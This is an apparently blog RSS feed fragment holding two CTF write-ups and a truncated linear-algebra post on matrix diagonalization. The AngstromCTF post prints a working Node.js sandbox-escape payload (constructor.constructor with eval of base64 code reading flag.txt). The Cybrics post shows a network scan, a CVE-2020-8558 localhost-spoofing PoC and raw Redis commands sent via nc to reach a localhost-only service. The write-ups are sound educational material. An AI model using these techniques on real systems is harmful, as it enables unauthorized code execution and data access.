+&lt;div class=&quot;language-bash highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;span class=&quot;nv&quot;&gt;$ &lt;/span&gt;nc challs.actf.co 31337 
+Welcome to CaaSio: Please Stop Edition! Enter your calculation:
+with&lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;/a&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;%22constructor%22%3Bwith%28this%5Ba%5D%5Ba%5D%28%22return%20this%22%29%28%29%29eval%28atob%28%22cHJvY2Vzcy5tYWluTW9kdWxlLnJlcXVpcmUoImZzIikucmVhZEZpbGVTeW5jKCJmbGFnLnR4dCIp%22%29%29/&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt;&lt;span class=&quot;nb&quot;&gt;eval&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;unescape&lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;nb&quot;&gt;source&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;))&lt;/span&gt;
+Result:
+&amp;lt;Buffer 61 63 74 66 7b 6f 6d 67 5f 6a 73 5f 69 73 5f 6c 69 6b 65 5f 73 6f 5f 71 75 69 72 6b 79 5f 68 61 68 61 7d 0a&amp;gt;
+See, isn&lt;span class=&quot;s1&quot;&gt;&apos;t the calculator so much nicer when you&apos;&lt;/span&gt;re not trying to hack it?
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
+
+&lt;p&gt;We can decode that locally with:&lt;/p&gt;
+
+&lt;div class=&quot;language-js highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;span class=&quot;o&quot;&gt;&amp;gt;&lt;/span&gt; &lt;span class=&quot;nb&quot;&gt;String&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;fromCharCode&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;mh&quot;&gt;0x61&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;mh&quot;&gt;0x63&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;mh&quot;&gt;0x74&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;mh&quot;&gt;0x66&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;mh&quot;&gt;0x7b&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;mh&quot;&gt;0x6f&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;mh&quot;&gt;0x6d&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;mh&quot;&gt;0x67&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;mh&quot;&gt;0x5f&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;mh&quot;&gt;0x6a&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;mh&quot;&gt;0x73&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;mh&quot;&gt;0x5f&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;mh&quot;&gt;0x69&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;mh&quot;&gt;0x73&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;mh&quot;&gt;0x5f&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;mh&quot;&gt;0x6c&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;mh&quot;&gt;0x69&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;mh&quot;&gt;0x6b&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;mh&quot;&gt;0x65&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;mh&quot;&gt;0x5f&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;mh&quot;&gt;0x73&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;mh&quot;&gt;0x6f&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;mh&quot;&gt;0x5f&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;mh&quot;&gt;0x71&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;mh&quot;&gt;0x75&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;mh&quot;&gt;0x69&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;mh&quot;&gt;0x72&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;mh&quot;&gt;0x6b&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;mh&quot;&gt;0x79&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;mh&quot;&gt;0x5f&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;mh&quot;&gt;0x68&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;mh&quot;&gt;0x61&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;mh&quot;&gt;0x68&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;mh&quot;&gt;0x61&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;mh&quot;&gt;0x7d&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;mh&quot;&gt;0x0a&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;
+&lt;span class=&quot;dl&quot;&gt;&apos;&lt;/span&gt;&lt;span class=&quot;s1&quot;&gt;actf{omg_js_is_like_so_quirky_haha}&lt;/span&gt;&lt;span class=&quot;se&quot;&gt;\n&lt;/span&gt;&lt;span class=&quot;dl&quot;&gt;&apos;&lt;/span&gt;
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
+
+&lt;p&gt;flag: &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;actf{omg_js_is_like_so_quirky_haha}&lt;/code&gt;&lt;/p&gt;
+
+&lt;h2 id=&quot;references&quot;&gt;References&lt;/h2&gt;
+
+&lt;p&gt;There are some excellent articles on how &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;{}.constructor.constructor&lt;/code&gt; and the &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;vm&lt;/code&gt; modules works:&lt;/p&gt;
+
+&lt;ul&gt;
+  &lt;li&gt;&lt;a href=&quot;https://sekai.team/blog/dice-ctf-2022/vm-calc/&quot;&gt;https://sekai.team/blog/dice-ctf-2022/vm-calc/&lt;/a&gt;&lt;/li&gt;
+  &lt;li&gt;&lt;a href=&quot;https://pwnisher.gitlab.io/nodejs/sandbox/2019/02/21/sandboxing-nodejs-is-hard.html&quot;&gt;https://pwnisher.gitlab.io/nodejs/sandbox/2019/02/21/sandboxing-nodejs-is-hard.html&lt;/a&gt;&lt;/li&gt;
+  &lt;li&gt;&lt;a href=&quot;https://www.netspi.com/blog/technical/web-application-penetration-testing/escape-nodejs-sandboxes/&quot;&gt;https://www.netspi.com/blog/technical/web-application-penetration-testing/escape-nodejs-sandboxes/&lt;/a&gt;&lt;/li&gt;
+  &lt;li&gt;&lt;a href=&quot;https://thegoodhacker.com/posts/the-unsecure-node-vm-module/&quot;&gt;https://thegoodhacker.com/posts/the-unsecure-node-vm-module/&lt;/a&gt;&lt;/li&gt;
+  &lt;li&gt;&lt;a href=&quot;https://odino.org/eval-no-more-understanding-vm-vm2-nodejs/&quot;&gt;https://odino.org/eval-no-more-understanding-vm-vm2-nodejs/&lt;/a&gt;&lt;/li&gt;
+&lt;/ul&gt;
+</description>
+                <pubDate>Wed, 11 May 2022 00:00:00 +0000</pubDate>
+                <link>https://stdor7314.github.io/2022/05/11/AngstromCTF2022-CaaSio-PSE.html</link>
+                <guid isPermaLink="true">https://stdor7314.github.io/2022/05/11/AngstromCTF2022-CaaSio-PSE.html</guid>
+                
+                <category>ctf</category>
+                
+                <category>ctf-writeups</category>
+                
+                <category>ctf-misc</category>
+                
+                <category>js-jail-escape</category>
+                
+                
+            </item>
+        
+            <item>
+                <title>Cybrics CTF 2021: localhost</title>
+                <description>&lt;p&gt;Most of the CTF web challenges work on the Application layer. This is the first time I have encountered one that works on the Network layer. It’s quite an inspiring challenge.&lt;/p&gt;
+
+&lt;!--more--&gt;
+
+&lt;h2 id=&quot;the-challenge&quot;&gt;The challenge&lt;/h2&gt;
+
+&lt;blockquote&gt;
+  &lt;p&gt;Author: Vlad Roskov (&lt;a href=&quot;https://t.me/mrvos&quot;&gt;@mrvos&lt;/a&gt;)&lt;/p&gt;
+
+  &lt;p&gt;Remember NET fleeks? I’ve pwned a box in another corporate network,  and there is some peculiarly configured server near my foothold. Take a  look.&lt;/p&gt;
+
+  &lt;div class=&quot;language-bash highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;ssh localhost@109.233.61.10
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;  &lt;/div&gt;
+&lt;/blockquote&gt;
+
+&lt;h2 id=&quot;writeup&quot;&gt;Writeup&lt;/h2&gt;
+
+&lt;p&gt;According to the description, we should first find the &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;peculiarly configured server&lt;/code&gt;. It was kind of the author to include &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;nmap&lt;/code&gt; for us.&lt;/p&gt;
+
+&lt;div class=&quot;language-bash highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;root@PWNED:~&lt;span class=&quot;nv&quot;&gt;$ &lt;/span&gt;&lt;span class=&quot;nb&quot;&gt;hostname&lt;/span&gt; &lt;span class=&quot;nt&quot;&gt;-i&lt;/span&gt;
+10.193.162.7
+
+root@PWNED:~&lt;span class=&quot;nv&quot;&gt;$ &lt;/span&gt;nmap &lt;span class=&quot;nt&quot;&gt;-sn&lt;/span&gt; 10.193.162.7/24
+Starting Nmap 7.70 &lt;span class=&quot;o&quot;&gt;(&lt;/span&gt; https://nmap.org &lt;span class=&quot;o&quot;&gt;)&lt;/span&gt; at 2021-07-25 08:22 UTC
+Nmap scan report &lt;span class=&quot;k&quot;&gt;for &lt;/span&gt;10.193.162.1
+Host is up &lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;0.00013s latency&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt;&lt;span class=&quot;nb&quot;&gt;.&lt;/span&gt;
+MAC Address: 02:42:E1:C9:F5:39 &lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;Unknown&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt;
+Nmap scan report &lt;span class=&quot;k&quot;&gt;for &lt;/span&gt;lh_tgt_418.lh_418 &lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;10.193.162.180&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt;
+Host is up &lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;0.000050s latency&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt;&lt;span class=&quot;nb&quot;&gt;.&lt;/span&gt;
+MAC Address: 02:42:0A:C1:A2:B4 &lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;Unknown&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt;
+Nmap scan report &lt;span class=&quot;k&quot;&gt;for &lt;/span&gt;PWNED &lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;10.193.162.7&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt;
+Host is up.
+Nmap &lt;span class=&quot;k&quot;&gt;done&lt;/span&gt;: 256 IP addresses &lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;3 hosts up&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt; scanned &lt;span class=&quot;k&quot;&gt;in &lt;/span&gt;3.87 seconds
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
+
+&lt;p&gt;So we go on to scan &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;10.193.162.180&lt;/code&gt;. The only listening service is HTTP running on port &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;80&lt;/code&gt;. Some config files are hosted there:&lt;/p&gt;
+
+&lt;div class=&quot;language-html highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;root@PWNED:~$ curl 10.193.162.180
+&lt;span class=&quot;nt&quot;&gt;&amp;lt;h1&amp;gt;&lt;/span&gt;Storage Node Status Page&lt;span class=&quot;nt&quot;&gt;&amp;lt;/h1&amp;gt;&lt;/span&gt;
+&lt;span class=&quot;nt&quot;&gt;&amp;lt;table&lt;/span&gt; &lt;span class=&quot;na&quot;&gt;border=&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;1&lt;/span&gt;&lt;span class=&quot;nt&quot;&gt;&amp;gt;&lt;/span&gt;
+    &lt;span class=&quot;nt&quot;&gt;&amp;lt;tr&amp;gt;&amp;lt;td&amp;gt;&lt;/span&gt;Records&lt;span class=&quot;nt&quot;&gt;&amp;lt;/td&amp;gt;&amp;lt;td&amp;gt;&lt;/span&gt;1&lt;span class=&quot;nt&quot;&gt;&amp;lt;/td&amp;gt;&amp;lt;/tr&amp;gt;&lt;/span&gt;
+    &lt;span class=&quot;nt&quot;&gt;&amp;lt;tr&amp;gt;&amp;lt;td&amp;gt;&lt;/span&gt;Flag-containing Records&lt;span class=&quot;nt&quot;&gt;&amp;lt;/td&amp;gt;&amp;lt;td&amp;gt;&lt;/span&gt;1&lt;span class=&quot;nt&quot;&gt;&amp;lt;/td&amp;gt;&amp;lt;/tr&amp;gt;&lt;/span&gt;
+    &lt;span class=&quot;nt&quot;&gt;&amp;lt;tr&amp;gt;&amp;lt;td&amp;gt;&lt;/span&gt;Redis Configuration&lt;span class=&quot;nt&quot;&gt;&amp;lt;/td&amp;gt;&amp;lt;td&amp;gt;&lt;/span&gt;Default: &lt;span class=&quot;nt&quot;&gt;&amp;lt;a&lt;/span&gt; &lt;span class=&quot;na&quot;&gt;href=&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&quot;redis.conf&quot;&lt;/span&gt;&lt;span class=&quot;nt&quot;&gt;&amp;gt;&lt;/span&gt;redis.conf&lt;span class=&quot;nt&quot;&gt;&amp;lt;/a&amp;gt;&amp;lt;/td&amp;gt;&amp;lt;/tr&amp;gt;&lt;/span&gt;
+    &lt;span class=&quot;nt&quot;&gt;&amp;lt;tr&amp;gt;&amp;lt;td&amp;gt;&lt;/span&gt;System Configuration&lt;span class=&quot;nt&quot;&gt;&amp;lt;/td&amp;gt;&amp;lt;td&amp;gt;&amp;lt;a&lt;/span&gt; &lt;span class=&quot;na&quot;&gt;href=&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&quot;sysctl.conf&quot;&lt;/span&gt;&lt;span class=&quot;nt&quot;&gt;&amp;gt;&lt;/span&gt;sysctl.conf&lt;span class=&quot;nt&quot;&gt;&amp;lt;/a&amp;gt;&amp;lt;/td&amp;gt;&amp;lt;/tr&amp;gt;&lt;/span&gt;
+    &lt;span class=&quot;nt&quot;&gt;&amp;lt;tr&amp;gt;&amp;lt;td&amp;gt;&lt;/span&gt;Security&lt;span class=&quot;nt&quot;&gt;&amp;lt;/td&amp;gt;&amp;lt;td&amp;gt;&lt;/span&gt;perfect!&lt;span class=&quot;nt&quot;&gt;&amp;lt;/td&amp;gt;&amp;lt;/tr&amp;gt;&lt;/span&gt;
+&lt;span class=&quot;nt&quot;&gt;&amp;lt;/table&amp;gt;&lt;/span&gt;
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
+&lt;ul&gt;
+  &lt;li&gt;Filtered content for &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;http://10.193.162.180/redis.conf&lt;/code&gt;:&lt;/li&gt;
+&lt;/ul&gt;
+
+&lt;div class=&quot;language-bash highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;span class=&quot;nb&quot;&gt;bind &lt;/span&gt;127.0.0.1
+protected-mode &lt;span class=&quot;nb&quot;&gt;yes
+&lt;/span&gt;port 6379
+tcp-backlog 511
+&lt;span class=&quot;nb&quot;&gt;timeout &lt;/span&gt;0
+tcp-keepalive 300
+daemonize &lt;span class=&quot;nb&quot;&gt;yes
+&lt;/span&gt;supervised no
+pidfile /var/run/redis/redis-server.pid
+loglevel notice
+logfile /var/log/redis/redis-server.log
+databases 16
+save 900 1
+save 300 10
+save 60 10000
+stop-writes-on-bgsave-error &lt;span class=&quot;nb&quot;&gt;yes
+&lt;/span&gt;rdbcompression &lt;span class=&quot;nb&quot;&gt;yes
+&lt;/span&gt;rdbchecksum &lt;span class=&quot;nb&quot;&gt;yes
+&lt;/span&gt;dbfilename dump.rdb
+&lt;span class=&quot;nb&quot;&gt;dir&lt;/span&gt; /var/lib/redis
+slave-serve-stale-data &lt;span class=&quot;nb&quot;&gt;yes
+&lt;/span&gt;slave-read-only &lt;span class=&quot;nb&quot;&gt;yes
+&lt;/span&gt;repl-diskless-sync no
+repl-diskless-sync-delay 5
+repl-disable-tcp-nodelay no
+slave-priority 100
+appendonly no
+appendfilename &lt;span class=&quot;s2&quot;&gt;&quot;appendonly.aof&quot;&lt;/span&gt;
+appendfsync everysec
+no-appendfsync-on-rewrite no
+auto-aof-rewrite-percentage 100
+auto-aof-rewrite-min-size 64mb
+aof-load-truncated &lt;span class=&quot;nb&quot;&gt;yes
+&lt;/span&gt;lua-time-limit 5000
+slowlog-log-slower-than 10000
+slowlog-max-len 128
+latency-monitor-threshold 0
+notify-keyspace-events &lt;span class=&quot;s2&quot;&gt;&quot;&quot;&lt;/span&gt;
+hash-max-ziplist-entries 512
+hash-max-ziplist-value 64
+list-max-ziplist-size &lt;span class=&quot;nt&quot;&gt;-2&lt;/span&gt;
+list-compress-depth 0
+set-max-intset-entries 512
+zset-max-ziplist-entries 128
+zset-max-ziplist-value 64
+hll-sparse-max-bytes 3000
+activerehashing &lt;span class=&quot;nb&quot;&gt;yes
+&lt;/span&gt;client-output-buffer-limit normal 0 0 0
+client-output-buffer-limit slave 256mb 64mb 60
+client-output-buffer-limit pubsub 32mb 8mb 60
+hz 10
+aof-rewrite-incremental-fsync &lt;span class=&quot;nb&quot;&gt;yes&lt;/span&gt;
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
+
+&lt;ul&gt;
+  &lt;li&gt;Filtered content for &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;http://10.193.162.180/sysctl.conf&lt;/code&gt;:&lt;/li&gt;
+&lt;/ul&gt;
+
+&lt;div class=&quot;language-bash highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;net.ipv4.conf.all.route_localnet&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;1
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
+
+&lt;p&gt;By &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;redis.conf&lt;/code&gt; I assume that a redis instance (used for data storage)  is running on &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;10.193.162.180:6397&lt;/code&gt;, but is only accessible locally because of the first line &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;bind 127.0.0.1&lt;/code&gt;. So our goal is to connect to it from the local side. That sounds SSRF-ish, but how do we do that without any proxy or \(``\)admin visit\(&quot;\) services?&lt;/p&gt;
+
+&lt;p&gt;Upon searching the config in &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;sysctl.conf&lt;/code&gt;, I stumbled on &lt;a href=&quot;https://github.com/tabbysable/POC-2020-8558&quot;&gt;this detailed article&lt;/a&gt;, which suggests that we could pretend to be coming from &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;127.0.0.1&lt;/code&gt; by altering IP packets directly. This does not work all the time, but it is possible in this scenario thanks to the configuration in &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;sysctl.conf&lt;/code&gt;. I then used the testing and PoC scripts provided by the author. Basically, the script captures the traffic sent to a fake address you’ve specified, modifies it and send the payload to the victim server.&lt;/p&gt;
+
+&lt;div class=&quot;language-bash highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;span class=&quot;nv&quot;&gt;$ &lt;/span&gt;python3 poc.py &lt;span class=&quot;nt&quot;&gt;--fakedestination&lt;/span&gt; 10.193.162.1 10.193.162.180 &amp;amp;
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
+
+&lt;p&gt;Normally you would want to use &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;redis-cli&lt;/code&gt; to connect to redis. But since the protocol can be handcrafted easily, I just used &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;nc&lt;/code&gt; for this.&lt;/p&gt;
+
+&lt;p&gt;Command: &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;KEYS *&lt;/code&gt;&lt;/p&gt;
+
+&lt;div class=&quot;language-bash highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;root@PWNED:~/&lt;span class=&quot;nv&quot;&gt;$ &lt;/span&gt;&lt;span class=&quot;nb&quot;&gt;echo&lt;/span&gt; &lt;span class=&quot;nt&quot;&gt;-e&lt;/span&gt; &lt;span class=&quot;s1&quot;&gt;&apos;*2\r\n$4\r\nKEYS\r\n$1\r\n*\r\n&apos;&lt;/span&gt; | nc 10.193.162.1 6379
+&lt;span class=&quot;k&quot;&gt;*&lt;/span&gt;1
+&lt;span class=&quot;nv&quot;&gt;$33&lt;/span&gt;
+flag_is_here_iedie8Ee5eniequ4uNie
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
+
+&lt;p&gt;Command: &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;GET flag_is_here_iedie8Ee5eniequ4uNie&lt;/code&gt;&lt;/p&gt;
+
+&lt;div class=&quot;language-bash highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;root@PWNED:~/&lt;span class=&quot;nv&quot;&gt;$ &lt;/span&gt;&lt;span class=&quot;nb&quot;&gt;echo&lt;/span&gt; &lt;span class=&quot;nt&quot;&gt;-e&lt;/span&gt; &lt;span class=&quot;s1&quot;&gt;&apos;*2\r\n$3\r\nGET\r\n$33\r\nflag_is_here_iedie8Ee5eniequ4uNie\r\n*\r\n&apos;&lt;/span&gt; | nc 10.193.162.1 6379
+&lt;span class=&quot;nv&quot;&gt;$61&lt;/span&gt;
+cybrics&lt;span class=&quot;o&quot;&gt;{&lt;/span&gt;m05T_C0mm0N_s3CuR1tY_m34SuRe_4nD_L34St_c0MmoN_sysctl&lt;span class=&quot;o&quot;&gt;}&lt;/span&gt;
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
+
+&lt;p&gt;flag: &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;cybrics{m05T_C0mm0N_s3CuR1tY_m34SuRe_4nD_L34St_c0MmoN_sysctl}&lt;/code&gt;&lt;/p&gt;
+
+&lt;h2 id=&quot;references&quot;&gt;References&lt;/h2&gt;
+
+&lt;ol&gt;
+  &lt;li&gt;&lt;a href=&quot;https://github.com/tabbysable/POC-2020-8558&quot;&gt;https://github.com/tabbysable/POC-2020-8558&lt;/a&gt;&lt;/li&gt;
+  &lt;li&gt;&lt;a href=&quot;https://www.compose.com/articles/how-to-talk-raw-redis/&quot;&gt;https://www.compose.com/articles/how-to-talk-raw-redis/&lt;/a&gt;&lt;/li&gt;
+&lt;/ol&gt;
+</description>
+                <pubDate>Mon, 26 Jul 2021 00:00:00 +0000</pubDate>
+                <link>https://stdor7314.github.io/2021/07/26/CybricsCTF2021-localhost.html</link>
+                <guid isPermaLink="true">https://stdor7314.github.io/2021/07/26/CybricsCTF2021-localhost.html</guid>
+                
+                <category>ctf</category>
+                
+                <category>ctf-writeups</category>
+                
+                <category>ctf-web</category>
+                
+                
+            </item>
+        
+            <item>
+                <title>The logic behind matrix diagonalization with eigenvectors</title>
+                <description>&lt;p&gt;Diagonalization has a really close relationship with eigenvectors - the standard steps in diagonalizing a matrix is to find the eigenvalues with an eigenbasis. It first seemed like magic to me before knowing why this works. In this post, I’ll try to explain the rationale behind with the concept of linear transformation with two approaches: similarity diagram and matrix. The former one is a derivation oriented on the whole basis and linear transformation landscape, and the latter is merely a verification of correctness based on pure matrix multiplication mechanics.&lt;/p&gt;
+
+&lt;!--more--&gt;
+
+&lt;h2 id=&quot;definitions&quot;&gt;Definitions&lt;/h2&gt;
+
+&lt;p&gt;First off, we’ll make some definitions to make sure we are on the same page:&lt;/p&gt;
+
+&lt;h3 id=&quot;diagonal-matrix&quot;&gt;Diagonal matrix&lt;/h3&gt;
+
+&lt;p&gt;A &lt;strong&gt;&lt;em&gt;diagonal matrix&lt;/em&gt;&lt;/strong&gt; is a matrix in which all entries are zeros, except possibly the entries that lie on the diagonal line ($a_{ij} ~\forall i=j$)&lt;/p&gt;
+
+\[\text{Diagonal matrix } D = 
+\begin{pmatrix}
+a_{11} &amp;amp; &amp;amp; &amp;amp; \\
+&amp;amp; a_{22} &amp;amp; &amp;amp; \\
+&amp;amp; &amp;amp; \ddots &amp;amp; \\
+&amp;amp; &amp;amp; &amp;amp; a_{nn} \\
+\end{pmatrix}\]
+
+&lt;p&gt;&lt;strong&gt;&lt;em&gt;Diagonalization&lt;/em&gt;&lt;/strong&gt; is the process of expressing a square matrix $A$ into a product of matrices, such that for diagonal matrix $D$ and non-singular matrix $P$,&lt;/p&gt;
+
+\[A = PDP^{-1}.\]
+
+&lt;h3 id=&quot;basis&quot;&gt;Basis&lt;/h3&gt;
+
+&lt;p&gt;A &lt;strong&gt;&lt;em&gt;basis&lt;/em&gt;&lt;/strong&gt; is a set of linear independent vectors that spans a vector space. We now define the $\text{Rep}$ notation. For a basis $B$ that consists of three vectors $\lang \vec{\beta_1}, \vec{\beta_2}, \vec{\beta_3} \rang$, the notation&lt;/p&gt;
+
+\[\text{Rep}_B({\vec{v}})= \begin{pmatrix}c_1\\c_2\\c_3\end{pmatrix}\]
+
+&lt;p&gt;means that&lt;/p&gt;
+
+\[\vec{v}=c_1\vec{\beta}_1+c_2\vec{\beta}_2+c_3\vec{\beta}_3.\]
+
+&lt;p&gt;That is, we are expressing $\vec{v}$ from standard basis $\varepsilon_3$ in basis $B$. If that’s too abstract, you can check out 3blue1brown’s explanation with visualizations &lt;a href=&quot;https://www.youtube.com/watch?v=P2LTAUO1TdA&quot;&gt;here&lt;/a&gt;.&lt;/p&gt;
+
+&lt;h4 id=&quot;standard-basis&quot;&gt;Standard basis&lt;/h4&gt;
+
+&lt;p&gt;The &lt;strong&gt;&lt;em&gt;standard basis&lt;/em&gt;&lt;/strong&gt; $\varepsilon_n$ is the basis \(\lang \begin{pmatrix}1 \\0\\ \vdots \\ 0\end{pmatrix}, \begin{pmatrix}0 \\1\\ \vdots \\ 0\end{pmatrix},~ \dots ~,\begin{pmatrix}0 \\ 0 \\ \vdots \\ 1\end{pmatrix}\rang\). For example, $\varepsilon_3$ is the familiar $xyz$ coordinate.&lt;/p&gt;
+
+&lt;h3 id=&quot;change-of-basis-matrix&quot;&gt;Change of basis matrix&lt;/h3&gt;
+
+&lt;p&gt;A &lt;strong&gt;&lt;em&gt;Change of basis matrix&lt;/em&gt;&lt;/strong&gt; that changes a vector from basis $B$ to $D$ is denoted by $\text{Rep}_{B,D}(id)$. Note that a linear transformation represented by a matrix is to be applied on the left. Consider the following operation:&lt;/p&gt;
+
+\[\text{Rep}_{B,D}(id)\times\text{Rep}_B(\vec{v})=\text{Rep}_D(\vec{v})\]
+
+&lt;p&gt;Originally, we have $\vec{v}$ expressed in basis $B$. By multiplying the change of basis matrix on the left, it is now expressed in basis $D$.&lt;/p&gt;
+
